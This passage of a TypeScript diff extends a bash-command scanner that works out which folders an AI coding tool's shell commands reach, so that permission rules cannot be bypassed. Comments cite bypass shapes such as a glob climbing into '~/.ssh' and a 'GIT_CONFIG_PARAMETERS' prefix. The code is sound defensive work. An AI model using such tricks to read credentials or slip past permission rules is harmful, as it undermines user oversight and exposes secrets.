+        if (text === '' || text.startsWith('-') || /[\s'"\\*?[]/.test(text)) return false;
+        const kind = await kindOf(text);
+        if (kind === null || (kind === 'folder' && follows)) return false;
+        if (kind === 'missing' && feed.ls) continue;
+        if (writing) noteWrite(text, kind === 'folder' ? writtenTrees : writes);
+        await checkArgument(exactWord(text), writing ? 'write' : 'read', true);
+      }
+      return true;
+    };
+
+    /** Whether `operand` lies within a link this script made, whose target the scan cannot read. */
+    const underCreatedLink = (cwd: string, operand: string, reader: OperandReader): boolean =>
+      createdLinks.size > 0 &&
+      operandTargets(cwd, operand, reader).some(target =>
+        [...createdLinks].some(link => guardFormWithin(link, guardForm(target)))
+      );
+
+    /** One word's glob shape and the folder it reaches, moved up for each component that can walk up. */
+    const shapeOf = (
+      word: OperandWord,
+      operand: ReadOperand,
+      rules: { dirname: (path: string) => string },
+      windows: boolean,
+      cwd: string
+    ): { shape: GlobShape | null; folder: string } => {
+      const shape =
+        operand.start === null || operand.unread
+          ? null
+          : globShape(word, operand.start, dotGlob, windows ? /[\\/]/ : /\//);
+      let folder = operand.path;
+      if ((shape?.up ?? 0) > 0 && !isAbsolutePath(folder)) {
+        // Climbing from a relative `.` would stay put, so the climb starts from the folder it names.
+        if (sep === '/' && wslLocation(cwd) === null) folder = posix.resolve(cwd, folder);
+        else unreadOperands++;
+      }
+      for (let up = 0; up < (shape?.up ?? 0); up++) folder = rules.dirname(folder);
+      return { shape, folder };
+    };
+
+    /**
+     * A `probe` only reads, so a toolchain folder it names is recorded as a path, not an outside folder to grant.
+     * Returns where the command lands, which is what a `cd` moves to.
+     */
+    const check = async (
+      raw: string,
+      cwd: string,
+      probe = false,
+      reader: OperandReader = 'program',
+      reach: Reach | null = null
+    ): Promise<string | null> => {
+      if (expired) return null;
+      if (reader === 'windows') {
+        const [device, text] = windowsDevicePath(raw);
+        if (state.lost && !isAbsolutePath(device + text)) unreadOperands++;
+        return checkWord(literalWord(text), device, cwd, probe, reader, reach);
+      }
+      const words = operandWords(raw, scope());
+      if (words === null) {
+        unreadOperands++;
+        return null;
+      }
+      let landed: string | null = null;
+      for (const word of words) {
+        if (processPath(word.text, cwd)) unreadOperands++;
+        const checked = await checkWord(word, '', cwd, probe, reader, reach);
+        landed ??= checked;
+      }
+      return landed;
+    };
+
+    const checkWord = async (
+      word: OperandWord,
+      device: string,
+      cwd: string,
+      probe: boolean,
+      reader: OperandReader,
+      reach: Reach | null
+    ): Promise<string | null> => {
+      const { text } = word;
+      if (text === '') return null;
+      const rules = reader === 'windows' ? win32 : operandRules(cwd);
+      const operand = readOperand(word, rules.dirname);
+      if (operand.unread) unreadOperands++;
+      if (reader !== 'windows') {
+        if (operand.start === null) await viaProcessLink(text, cwd);
+        const linked = await linkMatches(word, operand, cwd);
+        if (linked === null) unreadOperands++;
+        for (const match of linked ?? []) await checkWord(exactWord(match), device, cwd, probe, reader, reach);
+      }
+      const { shape, folder } = shapeOf(word, operand, rules, reader === 'windows' || sep === '\\', cwd);
+      const prefix = device + folder;
+      if (underCreatedLink(cwd, prefix, reader)) unreadOperands++;
+      const named = operand.start === null ? prefix : device + text.slice(0, operand.start);
+      // A glob can expand to `..` (`~/.nvm*/../.ssh`, `~/.nvm/.?/.ssh`), so a dot after the glob never stays inside.
+      const stays =
+        operand.start === null || (!operand.unread && !text.slice(operand.start).includes('.') && !named.endsWith('.'));
+      const dotless = shape?.dotless === true;
+      const reached = async (place: string): Promise<void> => {
+        if (operand.start !== null) await reachFolder(place, dotless, reach);
+        else if (reach) await reachFolder(place, false, reach);
+        if (shape?.namesSettings) addPath(join(place, '.claude'));
+      };
+      const places = await operandPlaces(prefix, allowed, cwd, reader);
+      let own = false;
+      for (const { lexical, physical, inside } of places) {
+        if (inUngrantedDistro(lexical, allowed)) {
+          // Outside without a look: reading it over the share would start that distro.
+          ungranted.add(lexical);
+        } else if (inside && physical !== null) {
+          addPath(physical);
+          if (operand.start === null) own = true;
+          await reached(physical);
+        } else {
+          await reached(lexical);
+          addPath(lexical);
+          // Named without a look, so the scan opens no connection to that computer.
+          if (physical === null && onAnotherComputer(lexical)) {
+            directories.add(dirname(lexical));
+            continue;
+          }
+          addPath(await realpathNearest(lexical));
+          if (reader !== 'windows' && HARMLESS_DEVICES.has(lexical)) continue;
+          if (probe && stays && (await isToolchainPath(named, cwd, home))) continue;
+          const isDirectory = (await stat(lexical).catch(() => null))?.isDirectory() === true;
+          directories.add(isDirectory ? lexical : dirname(lexical));
+        }
+      }
+      if (own) for (const place of await ownPlaces(prefix, cwd, allowed, reader)) addPath(place);
+      const landed = places[0];
+      return landed?.inside && landed.physical !== null ? landed.physical : (landed?.lexical ?? null);
+    };
+
+    /**
+     * Where the scan believes bash is. `lost` once a directory change may or may not have happened, from which
+     * point every relative operand is unread; `stackLost` once the pushd stack is no longer known. `cwd` is where
+     * operands resolve, and `logical` is bash's $PWD, which a `cd` without `-P` folds `..` against.
+     */
+    const state = {
+      cwd: startDirectory,
+      logical: startDirectory,
+      previous: startDirectory,
+      previousLogical: startDirectory,
+      stack: [] as { cwd: string; logical: string; lost: boolean }[],
+      lost: false,
+      previousLost: false,
+      stackLost: false,
+    };
+    type Place = typeof state;
+    const snapshot = (): Place => ({ ...state, stack: [...state.stack] });
+    const restore = (place: Place): void => {
+      Object.assign(state, place, { stack: [...place.stack] });
+    };
+    const samePlace = (a: Place, b: Place): boolean =>
+      a.cwd === b.cwd && a.lost === b.lost && a.stack.length === b.stack.length && a.stackLost === b.stackLost;
 
     const run = async (node: Node): Promise<void> => {
+      const unreadBefore = unreadOperands;
+      if (state.lost) ranLost = true;
+      let entry: ShellCommand | null = null;
+      unreadOwners++;
+      try {
+        entry = await runOwned(node, unreadBefore);
+      } finally {
+        unreadOwners--;
+      }
+      claimUnread(unreadBefore, entry);
+    };
+
+    const runOwned = async (node: Node, unreadBefore: number): Promise<ShellCommand | null> => {
+      if (readsToplevel && !state.lost && !toplevels.has(state.cwd) && /rev-parse/.test(node.text)) {
+        toplevels.set(state.cwd, wslLocation(state.cwd) ? null : await gitToplevel(state.cwd));
+      }
       for (const child of node.children) {
         if (child && child.type !== 'command_name') await visit(child);
       }
 
       const tokens = node.children.some(child => child?.type === 'command_name') ? words(node) : [];
-      if (tokens.length === 0) return;
-      const [program, ...rest] = tokens;
-
-      if (CHANGES_DIRECTORY.has(program)) {
-        await changeDirectory(program, rest);
-        return;
-      }
-
-      const normalised = commandTokens(tokens);
-      const assigns = node.namedChildren.some(child => child?.type === 'variable_assignment');
-      const writes = writtenCommands.has(node.id) || hasWriteRedirect(node);
-      const arithmetic = tokens.some(token => EVALUATES_ARITHMETIC.test(token));
-      const opaque = opaqueForm(tokens);
-      const coverable = !assigns && !writes && !arithmetic && droppedOnlySafeOptions(tokens);
-      // Exact rules must name the unsafe syntax too: dropping an assignment or output redirect
-      // would let `Bash(git status)` cover `GIT_CONFIG_PARAMETERS=... git status` or a file write.
-      const original = node.parent?.type === 'redirected_statement' ? node.parent.text : node.text;
-      commands.push({
-        text: normalised.join(' '),
-        always: `${arityPrefix(normalised).join(' ')} *`,
-        coverable,
-        words: coverable ? tokens.join(' ') : original,
-        ...(opaque ? { opaque } : {}),
-      });
-      const sends = outboundReason(tokens, readsStdin(node));
-      if (sends) outbound.add(sends);
-      if (sends || assigns || arithmetic || !containedCommand(tokens)) contained = false;
-      for (const arg of rest) if (!arg.startsWith('-')) noteEnvFile(arg);
-      for (const directory of directoryOptionValues(tokens)) await check(directory, state.cwd);
-      if (!TOUCHES_FILES.has(program)) {
-        // Programs outside the folder-discovery list can still name permission files (sed,
-        // awk, dd, ...). Record static operands for the permission-file floor too, including
-        // option values, without treating every ordinary argument as an outside folder grant.
-        for (const arg of rest) {
-          const value = arg.includes('=') ? arg.slice(arg.indexOf('=') + 1) : arg;
-          if (value.startsWith('-')) continue;
-          const prefix = globPrefix(expandHome(unquote(value)));
-          if (!prefix || isDynamic(prefix)) continue;
-          const filesystemRoot = parse(resolve(state.cwd, prefix)).root;
-          paths.add(await resolveWithinRootsPhysically(prefix, [filesystemRoot], state.cwd));
+      if (tokens.length === 0) return null;
+      const effects = wrapperEffects(tokens);
+      const outer = writer;
+      writer = node.id;
+      // `env -C DIR`, `sudo -D DIR`: the command runs from DIR, and this shell stays where it was.
+      const saved = effects.folders.length > 0 ? snapshot() : null;
+      const outerPart = part;
+      const current = { places: [] as string[], reads: false };
+      part = current;
+      let ranIn: string | null = null;
+      try {
+        for (const folder of effects.folders) await enterFolder(folder);
+        ranIn = state.lost ? null : state.cwd;
+        return await runCommand(node, tokens, effects, unreadBefore);
+      } finally {
+        part = outerPart;
+        if (!current.reads) {
+          for (const place of current.places) writtenPlaces.add(place);
+          if (ranIn !== null) writtenPlaces.add(ranIn);
         }
-        return;
-      }
-      for (const arg of rest) {
-        if (arg.startsWith('-') || (program === 'chmod' && arg.startsWith('+'))) continue;
-        await check(arg, state.cwd);
+        if (saved) restore(saved);
+        writer = outer;
       }
     };
 
-    const changeDirectory = async (program: string, rest: string[]): Promise<void> => {
-      if (program === 'popd') {
-        const back = state.stack.pop();
-        if (back) {
-          state.previous = state.cwd;
-          state.cwd = back;
+    /** Moves the scan into a wrapper's working folder; a folder it cannot name leaves it lost. */
+    const enterFolder = async (raw: string): Promise<void> => {
+      const words = operandWords(raw, scope());
+      const before = unreadOperands;
+      const named =
+        words?.length === 1 && readOperand(words[0] as OperandWord, operandRules(state.cwd).dirname).start === null;
+      const next = named ? await check(raw, state.cwd, false, 'shell') : null;
+      if (next === null || unreadOperands > before) {
+        if (unreadOperands === before) unreadOperands++;
+        state.lost = true;
+        return;
+      }
+      state.cwd = next;
+      state.logical = next;
+    };
+
+    /**
+     * The folder to read git's config from for a call in `cwd`: itself, or for a folder only a `mkdir` of this script
+     * creates (nothing else writes in or around it), the nearest folder that exists, whose repository it will be in.
+     */
+    const lookupFolder = async (cwd: string): Promise<string> => {
+      const exists = async (path: string): Promise<boolean> =>
+        (await stat(path).catch(() => null))?.isDirectory() === true;
+      if (wslLocation(cwd) !== null || (await exists(cwd))) return cwd;
+      let existing = dirname(cwd);
+      while (!(await exists(existing))) {
+        if (dirname(existing) === existing) return cwd;
+        existing = dirname(existing);
+      }
+      const target = guardForm(cwd);
+      const within = (write: { path?: string }, outer: boolean): boolean => {
+        const form = guardForm(write.path ?? '');
+        return outer ? guardFormWithin(form, target) : guardFormWithin(target, form);
+      };
+      // A plain copy leaves no repository only at its own target; below it a nested one may be.
+      const makes = (write: { id: number; path?: string }): boolean =>
+        mkdirIds.has(write.id) ||
+        (plainCopies.has(write.id) &&
+          (write.path === undefined ||
+            guardForm(write.path) === target ||
+            !guardFormWithin(guardForm(write.path), target)));
+      const made = configWrites.some(write => makes(write) && write.path !== undefined && within(write, true));
+      const other = configWrites.some(
+        write => !makes(write) && (write.path === undefined || within(write, true) || within(write, false))
+      );
+      return made && !other ? existing : cwd;
+    };
+
+    /** Whether `write` may change the config git reads in `target`: a `.git`, a `gitconfig`, or a replacement of it. */
+    const changesConfigNear = (write: (typeof configWrites)[number], target: string): boolean => {
+      if (write.path === undefined) return !write.unlisted;
+      const form = guardForm(write.path);
+      if (guardFormWithin(form, target)) return true;
+      const dotGit = /(^|\/)\.git(\/|$)/.exec(form);
+      if (dotGit && guardFormWithin(form.slice(0, dotGit.index) || '/', target)) return true;
+      if (dotGit && guardFormWithin(target, form.slice(0, dotGit.index) || '/')) return true;
+      const name = posix.basename(form);
+      return name === '.gitconfig' || name === 'gitconfig';
+    };
+
+    /** Whether the file `write` names may be a config git reads anywhere: a tree, a `.git` or a `gitconfig`. */
+    const mayChangeConfig = (write: (typeof configWrites)[number]): boolean => {
+      if (write.path === undefined || write.removal) return false;
+      const form = guardForm(write.path);
+      const name = posix.basename(form);
+      return write.tree === true || /(^|\/)\.git(\/|$)/.test(form) || name === '.gitconfig' || name === 'gitconfig';
+    };
+
+    /** Where git reads aliases for a call in `cwd`: a folder this script clones, inits or adds starts from the user's. */
+    const aliasSource = async (cwd: string): Promise<{ folder: string; user: boolean; from: string }> => {
+      const target = guardForm(cwd);
+      for (const [id, made] of createdFolders) {
+        if (!guardFormWithin(guardForm(made.folder), target)) continue;
+        const touched = configWrites.some(
+          write => write.id !== id && !mkdirIds.has(write.id) && changesConfigNear(write, target)
+        );
+        if (touched) break;
+        if (!made.user) return { folder: await lookupFolder(made.from), user: false, from: made.from };
+        let existing = dirname(made.folder);
+        while ((await stat(existing).catch(() => null))?.isDirectory() !== true) {
+          if (dirname(existing) === existing) return { folder: cwd, user: false, from: made.from };
+          existing = dirname(existing);
+        }
+        return { folder: existing, user: true, from: made.from };
+      }
+      return { folder: await lookupFolder(cwd), user: false, from: cwd };
+    };
+
+    /**
+     * `written` with the git alias it names expanded as git in its folder would, or as written when it names none; null
+     * for a shell alias, an autocorrect guess, or config the script may change or the scan's git may not read alike.
+     */
+    const gitAliasExpansion = async (node: Node, written: string[]): Promise<string[] | null> => {
+      const results: (string[] | null)[] = [];
+      for (const seen of namedFolders(written)) results.push(await expandGitAlias(node, written, seen));
+      const [first] = results;
+      return first !== null && results.every(each => each !== null && each.join(' ') === (first as string[]).join(' '))
+        ? (first as string[])
+        : null;
+    };
+
+    /**
+     * `written` with each `-C` folder of a git call replaced by the folders its words name here (`$PWD/src`, `~/x`, a
+     * `for` variable), one variant per combination; the words as written for a folder the scan cannot name.
+     */
+    const namedFolders = (written: string[]): string[][] => {
+      const start = wrappedStart(written);
+      if (programName(unquote(written[start] ?? '')) !== 'git') return [written];
+      const raw = written.slice(start + 1);
+      const at = gitSubcommandAt(raw);
+      let variants: string[][] = [written];
+      for (let index = 0; index < (typeof at === 'number' ? at : raw.length); index++) {
+        if (unquote(raw[index] ?? '') !== '-C' || raw[index + 1] === undefined) continue;
+        const slot = start + index + 2;
+        const words = operandWords(raw[++index] as string, scope());
+        if (words === null || words.some(word => word.expandAt !== null || word.glob.includes(true))) continue;
+        variants = variants.flatMap(variant =>
+          words.map(word =>
+            variant.map((each, place) => (place === slot ? `'${word.text.replaceAll("'", "'\\''")}'` : each))
+          )
+        );
+        if (variants.length > 8) return [written];
+      }
+      return variants;
+    };
+
+    const aliasesAt = (folder: string, user: boolean, from = folder): Promise<GitAliases | null> => {
+      const key = user ? `user:${folder}:${from}` : folder;
+      let lists = gitAliasLists.get(key);
+      if (lists === undefined) gitAliasLists.set(key, (lists = gitAliases(folder, user, from)));
+      return lists;
+    };
+
+    const expandGitAlias = async (node: Node, written: string[], seenFrom: string[]): Promise<string[] | null> => {
+      let tokens = written;
+      let seen = seenFrom;
+      let checked = false;
+      for (let depth = 0; depth <= GIT_ALIAS_DEPTH; depth++) {
+        const start = wrappedStart(tokens);
+        if (programName(unquote(tokens[start] ?? '')) !== 'git') return tokens;
+        const git = gitSubcommand(seen.slice(start + 1).map(unquote), state.cwd);
+        if (git === null || git.unread || GIT_OWN_COMMANDS.has(git.sub) || SPELLED_PROGRAM.test(git.sub)) return tokens;
+        if (depth === GIT_ALIAS_DEPTH) return null;
+        const { folder, user, from } = await aliasSource(git.cwd);
+        if (sourced || state.lost) {
+          // Where git runs and which PATH it searches are not known; a `!` alias runs a shell wherever it is read.
+          let root = folder;
+          while ((await stat(root).catch(() => null))?.isDirectory() !== true && dirname(root) !== root) {
+            root = dirname(root);
+          }
+          const kind = await gitCommandKind(root, git.sub);
+          if (kind !== 'own' || !(await gitListsBuiltin(root, git.sub))) pathUnplaced = true;
+          // An earlier write may have changed the config, which is not checked against a folder the scan lost.
+          if (kind === null || configWrites.some(write => write.id !== node.id && mayChangeConfig(write))) return null;
+          const alias =
+            kind === 'own' ? undefined : (await aliasesAt(root, user, from))?.aliases.get(git.sub.toLowerCase());
+          return alias === null || alias?.startsWith('!') ? null : tokens;
+        }
+        const known = await gitCommandKind(folder, git.sub);
+        if (known === null) return null;
+        if (known === 'own') return tokens;
+        const path = scriptPathEntries();
+        if (
+          !checked &&
+          (gitAliasMoved(tokens.slice(start + 1)) || aliasEnvironment || dropsGitConfig(tokens) || unreadOperands > 0)
+        ) {
+          return null;
+        }
+        // A program named git-<alias> on a PATH entry the scan cannot place may run instead of the alias.
+        if (known === 'none' && path.unplaced) pathUnplaced = true;
+        if (known === 'none' && (await pathHolds(path.entries, `git-${git.sub}`))) return null;
+        const config = await aliasesAt(folder, user, from);
+        if (config === null) return null;
+        if (!checked) {
+          const check = {
+            own: node.id,
+            anywhere: branching > 0 || backgrounded,
+            alongside: alongsideOf(node),
+            cwd: folder,
+            places: await aliasPlaces(config.includes),
+            folders: known === 'none' ? [...path.entries, ...(await projectPathFolders(folder))].map(pathForm) : [],
+            programs: false,
+            legacy: !(await gitRefusesImplicitBare(folder)),
+          };
+          for (const write of configWrites) {
+            if (write.id !== node.id && (await aliasConfigTouched(write, check))) return null;
+          }
+          aliasChecks.push(check);
+        }
+        checked = true;
+        const alias = config.aliases.get(git.sub.toLowerCase());
+        if (alias === undefined) return known === 'none' && config.autocorrect ? null : tokens;
+        if (alias === null || alias.startsWith('!')) return null;
+        const expansion = splitGitAlias(alias)?.map(aliasWord) ?? null;
+        if (expansion === null || expansion[0] === "''" || expansion.some(word => word === null)) return null;
+        const at = tokens.length - git.rest.length - 1;
+        tokens = [...tokens.slice(0, at), ...(expansion as string[]), ...tokens.slice(at + 1)];
+        seen = [...seen.slice(0, at), ...(expansion as string[]), ...seen.slice(at + 1)];
+      }
+      return null;
+    };
+
+    // Folders `git clone`, `git init` and `git worktree add` make, whose aliases are read from the config they start from.
+    const createdFolders = new Map<number, { folder: string; from: string; user: boolean; sub: string }>();
+
+    /** The write a clone, init or work tree add reports for its folder; `reinit` for an init that writes no config. */
+    const noteFreshFolder = async (
+      node: Node,
+      words: readonly string[],
+      git: { sub: string; rest: readonly string[]; cwd: string }
+    ): Promise<{ id: number; path: string; tree: true } | 'reinit' | null> => {
+      const fresh = freshFolder(git.sub, git.rest.map(unquote));
+      if (fresh === null || state.lost || sep !== '/' || wslLocation(state.cwd) !== null) return null;
+      const at = gitSubcommandAt(words.map(unquote));
+      const options = typeof at === 'number' ? words.slice(0, at) : words;
+      if (gitAliasMoved(options) || options.some(option => /^(-c|--config-env.*)$/.test(wordValue(option))))
+        return null;
+      if (/[$`*?[{]/.test(fresh.folder) || isDynamic(fresh.folder) || /\.git(\/|$)/.test(fresh.folder)) return null;
+      const [place, ...more] = operandTargets(git.cwd, expand(fresh.folder));
+      if (place === undefined || more.length > 0) return null;
+      const found = await stat(place).catch(() => null);
+      if (found !== null) {
+        if (git.sub !== 'init' || !found.isDirectory() || git.rest.some(arg => unquote(arg) === '--bare')) return null;
+        const own = await lstat(join(place, '.git')).then(
+          () => true,
+          (error: unknown) => (missing(error) ? false : null)
+        );
+        if (own === null) return null;
+        if (own) return 'reinit';
+      }
+      createdFolders.set(node.id, { folder: place, from: git.cwd, user: fresh.user, sub: git.sub });
+      return { id: node.id, path: place, tree: true };
+    };
+
+    /** `-s NAME` and `--strategy NAME` run a git-merge-NAME from PATH unless built in; only cherry-pick and revert use `-s` for signoff. */
+    const checkMergeStrategies = async (
+      node: Node,
+      rest: readonly string[],
+      cwd: string,
+      sub: string
+    ): Promise<void> => {
+      const names: string[] = [];
+      const flags = MERGE_NO_VALUE_FLAGS.get(sub);
+      const shortStrategy = flags === undefined ? null : new RegExp(`^-[${flags}]*s(.*)$`);
+      for (let index = 0; index < rest.length; index++) {
+        const arg = rest[index] as string;
+        if (arg === '--') break;
+        const long = /^--strategy(=(.*))?$/.exec(arg);
+        const short = shortStrategy?.exec(arg);
+        if (long) names.push(long[1] === undefined ? (rest[++index] ?? '') : (long[2] ?? ''));
+        else if (short) names.push(short[1] || (rest[++index] ?? ''));
+      }
+      const custom = names.filter(name => !MERGE_STRATEGIES.has(name));
+      if (custom.length === 0) return;
+      if (custom.some(name => isDynamic(name))) {
+        unreadOperands++;
+        return;
+      }
+      await checkPathPrograms(
+        node,
+        cwd,
+        custom.map(name => `git-merge-${name}`)
+      );
+    };
+
+    /** `<name>::<address>` operands make git run a git-remote-<name> program from PATH, which the scan checks like git-merge-<name>. */
+    const checkRemoteHelpers = async (node: Node, sub: string, rest: readonly string[], cwd: string): Promise<void> => {
+      const verb = wordValue(rest[0] ?? '');
+      const reads = REMOTE_HELPER_COMMANDS.has(sub) || (sub === 'remote' && (verb === 'add' || verb === 'set-url'));
+      if (!reads) return;
+      const names = rest.flatMap(word => {
+        const name = /^([A-Za-z0-9][\w.+-]*)::/.exec(wordValue(word))?.[1];
+        return name === undefined || BUILT_IN_REMOTE_HELPERS.has(name) ? [] : [name];
+      });
+      if (names.length > 0) {
+        await checkPathPrograms(
+          node,
+          cwd,
+          names.map(name => `git-remote-${name}`)
+        );
+      }
+    };
+
+    /** Counts a program git looks up on PATH as unread when one is there or could be written there before `node` runs. */
+    const checkPathPrograms = async (node: Node, cwd: string, programs: readonly string[]): Promise<void> => {
+      const path = scriptPathEntries();
+      if (path.unplaced) pathUnplaced = true;
+      const folders = [...path.entries, ...(await projectPathFolders(cwd))];
+      for (const program of programs) {
+        if (await pathHolds(folders, program)) unreadOperands++;
+      }
+      const check = {
+        own: node.id,
+        anywhere: branching > 0 || backgrounded,
+        alongside: alongsideOf(node),
+        cwd,
+        places: [],
+        folders: folders.map(pathForm),
+        programs: true,
+        legacy: false,
+      };
+      for (const write of configWrites) {
+        if (write.id !== node.id && (await aliasConfigTouched(write, check))) unreadOperands++;
+      }
+      aliasChecks.push(check);
+    };
+
+    /**
+     * Records the trees `words` take away (see removedOperands) as removals; false, recording none, when one cannot be
+     * placed. A glob counts as the folder it opens from when that lies away from where bash is, else as what it matches.
+     */
+    const noteRemovals = async (node: Node, words: readonly string[]): Promise<boolean> => {
+      if (sep !== '/' || wslLocation(state.cwd) !== null) return false;
+      const removed: string[] = [];
+      for (const raw of words) {
+        if (isDynamic(raw)) return false;
+        const forms = operandWords(raw, scope());
+        if (forms === null) return false;
+        for (const word of forms) {
+          if (word.expandAt !== null || /(^|\/)\.git(\/|$)/.test(word.text)) return false;
+          if (!word.glob.includes(true)) {
+            removed.push(...operandTargets(state.cwd, word.text));
+            continue;
+          }
+          if (dotGlob || globOptions) return false;
+          let offset = 0;
+          let open: string | null = null;
+          const parts = word.text.split('/');
+          for (const [index, part] of parts.entries()) {
+            const globbed = word.glob.slice(offset, offset + part.length).includes(true);
+            if (globbed && open === null) open = parts.slice(0, index).join('/');
+            offset += part.length + 1;
+          }
+          const [folder] = open ? operandTargets(state.cwd, open) : [];
+          if (folder !== undefined && !guardFormWithin(guardForm(folder), guardForm(state.cwd))) {
+            removed.push(folder);
+            continue;
+          }
+          const found = await globExpansion(word, state.cwd, dotGlob, stopped);
+          if (found === null || (globOptions && found.length === 0)) return false;
+          removed.push(...found.map(match => match.path));
+        }
+      }
+      for (const path of removed) configWrites.push({ id: node.id, path, tree: true, removal: true });
+      return true;
+    };
+
+    /** The programs a git subcommand looks up on PATH: merge strategies and remote helpers. */
+    const checkGitPrograms = async (
+      node: Node,
+      git: { sub: string; rest: readonly string[]; cwd: string }
+    ): Promise<void> => {
+      if (STRATEGY_COMMANDS.has(git.sub)) await checkMergeStrategies(node, git.rest, git.cwd, git.sub);
+      await checkRemoteHelpers(node, git.sub, git.rest, git.cwd);
+    };
+
+    const runCommand = async (
+      node: Node,
+      written: string[],
+      effects: WrapperEffects,
+      unreadBefore: number
+    ): Promise<ShellCommand | null> => {
+      let expanded = await gitAliasExpansion(node, written);
+      if (expanded === null) unreadOperands++;
+      const launches = launchedGitCommands(written);
+      if (launches.unread) unreadOperands++;
+      let unlisted: GitReason | null = null;
+      // A signing reason outranks an earlier one that does not ask.
+      const noteUnlisted = (reason: GitReason | null): void => {
+        if (reason && (unlisted === null || (reason.kind === 'signing' && unlisted.kind !== 'signing'))) {
+          unlisted = reason;
+        }
+      };
+      for (const launched of launches.runs) {
+        const launchedExpansion = await gitAliasExpansion(node, launched);
+        const checked = launchedExpansion ?? launched;
+        if (launchedExpansion === null || untrackableCommand(checked) || programEnvironment(node, checked))
+          unreadOperands++;
+        if (launchedExpansion !== null)
+          noteUnlisted(await gitUnlistedReason(node, written, withoutWrappers(launchedExpansion).slice(1)));
+        const git = gitSubcommand(withoutWrappers(checked).slice(1).map(unquote), state.cwd);
+        const launchedChange = git && gitHistoryChange(git, withoutWrappers(checked).slice(1));
+        if (launchedChange) noteHistory(node.id, launchedChange);
+        if (git !== null && !git.unread) await checkGitPrograms(node, git);
+        if (expanded !== null && launchedExpansion !== null && launchedExpansion.join(' ') !== launched.join(' ')) {
+          const enclosing = expanded;
+          const at = enclosing.findIndex((_, index) =>
+            launched.every((word, offset) => enclosing[index + offset] === word)
+          );
+          if (at === -1) unreadOperands++;
+          else expanded = [...enclosing.slice(0, at), ...launchedExpansion, ...enclosing.slice(at + launched.length)];
+        }
+      }
+      const tokens = expanded ?? written;
+      const [program, ...rest] = tokens;
+      const [wrapped, ...wrappedRest] = withoutWrappers(tokens);
+      const inner = programName(unquote(wrapped ?? ''));
+      const [run = '', ...runArgs] =
+        inner === 'builtin'
+          ? [programName(unquote(wrappedRest[0] ?? '')), ...wrappedRest.slice(1)]
+          : [inner, ...wrappedRest];
+      // A shell given a string inherits the variable, and may run git with it.
+      const runsString =
+        run === 'eval' || (XARGS_SHELLS.has(run) && runArgs.some(arg => /^-[A-Za-z]*c/.test(unquote(arg))));
+      if (
+        effects.unread ||
+        untrackableCommand(tokens) ||
+        RESERVED_WORDS.has(wrapped ?? '') ||
+        ((inner === 'git' || runsString) && programEnvironment(node, tokens, runsString))
+      ) {
+        unreadOperands++;
+      }
+      for (const output of effects.outputs) {
+        noteWrite(output);
+        await check(output, state.cwd);
+      }
+      const feeds = xargsFeeds(tokens);
+      const consumer = withoutWrappers(tokens);
+      const replace = feeds ? xargsReplace(tokens) : null;
+      // A replace string inside a larger word, a wrapper's included, builds a path no lister prints.
+      const embedded =
+        replace !== null &&
+        (replace === '' ||
+          xargsCommand(tokens).some(word => wordValue(word) !== replace && wordValue(word).includes(replace)));
+      if (feeds && takesNoFiles(consumer)) {
+        // No NAMES_NOTHING option names or runs a file; a docker or git one may, so no fed word may read as one.
+        const plain = NAMES_NOTHING.has(programName(unquote(consumer[0] ?? '')));
+        if (embedded || (!plain && (feeds.file || stdinRedirected(node) || !optionFreeFeed(node)))) unreadOperands++;
+      } else if (feeds) {
+        // xargs runs its command on words it reads, which only a lister over checked folders keeps to them.
+        const writing = !onlyReads(consumer);
+        const listing = listerFeeds(node, gateText);
+        const nul = xargsReadsNul(tokens);
+        const delimiters = xargsDelimiters(tokens);
+        const fed = listing === null && xargsSplitsAtBlanks(tokens) ? staticFeed(node) : null;
+        if (
+          (writing && XARGS_SHELLS.has(programName(unquote(consumer[0] ?? '')))) ||
+          feeds.file ||
+          (listing === null && fed === null) ||
+          effects.folders.length > 0 ||
+          stdinRedirected(node) ||
+          // A newline delimiter splits at less than the checks below allow for; another may split inside a name.
+          !(delimiters.length === 0 || (!nul && delimiters.every(char => char === '\n'))) ||
+          // With a replace string each line is one name, and only ls prints one per line.
+          embedded ||
+          (replace !== null && fed !== null && !fed.ls) ||
+          !trusted(node, feeder(node).producer) ||
+          !(listing
+            ? listing.nul === nul && (await listingChecked(listing, writing, !nul))
+            : fed
+              ? await fedChecked(fed, writing, consumer)
+              : false)
+        ) {
+          unreadOperands++;
+        }
+      }
+      if (inner === 'mkdir') mkdirIds.add(node.id);
+      if (wrapped !== undefined) noteWrites(wrapped, wrappedRest);
+      if (inner === 'cp' || inner === 'rsync') await noteTemplateCopy(inner, wrappedRest, node.id);
+      const inPlace = await inPlaceWrites(withoutWrappers(tokens.map(unquote)), node, state.cwd, {
+        script: gitScript,
+        env: gitEnvironment,
+        roots,
+      });
+      if (inPlace.unread) unreadOperands++;
+      // In-place writes come back resolved against a folder that may not be where bash is.
+      if (state.lost && inPlace.files.length + inPlace.trees.length > 0) unreadOperands++;
+      for (const file of inPlace.files) noteWrite(file);
+      for (const tree of inPlace.trees) noteWrite(tree, writtenTrees);
+      if (
+        !CHANGES_DIRECTORY.has(program) &&
+        (effects.outputs.length > 0 ||
+          writtenCommands.has(node.id) ||
+          hasWriteRedirect(node) ||
+          inPlace.files.length + inPlace.trees.length > 0 ||
+          !onlyReads(tokens))
+      ) {
+        touchedBy.push(node.id);
+      }
+      if (LAUNCHES_COMMANDS.has(inner) && dropsBareRepositoryBehind(tokens)) unreadOperands++;
+      if (inner === 'git') {
+        gitCommands.add(node.id);
+        if (expanded !== null) noteUnlisted(await gitUnlistedReason(node, tokens, wrappedRest));
+        if (dropsBareRepository(tokens) || setsBareRepository(wrappedRest) || unsetsConfig) {
+          unreadOperands++;
+        }
+        const git = gitSubcommand(wrappedRest.map(unquote), state.cwd);
+        const change = git && gitHistoryChange(git, wrappedRest);
+        if (change) noteHistory(node.id, change);
+        else if (git !== null && !git.unread && git.sub === 'config' && !hasWriteRedirect(node)) {
+          plainConfigWriters.add(node.id);
+        }
+        if (git !== null && !git.unread) await checkGitPrograms(node, git);
+        if (feeds && namesInput(wrappedRest, replace)) unreadOperands++;
+        const fresh = git === null || git.unread ? null : await noteFreshFolder(node, wrappedRest, git);
+        if (fresh !== null && fresh !== 'reinit') configWrites.push(fresh);
+        else if (fresh === null && git !== null && (git.unread || writesGitConfig(git.sub, git.rest))) {
+          configWrites.push({ id: node.id });
+        } else if (fresh === null && git !== null && GIT_TREE_WRITERS.has(git.sub)) {
+          configWrites.push({ id: node.id, path: (await findRepositoryRoot(git.cwd)) ?? git.cwd, tree: true });
+        }
+      } else if (!CHANGES_DIRECTORY.has(program) && linksFiles(inner, wrappedRest.map(wordValue))) {
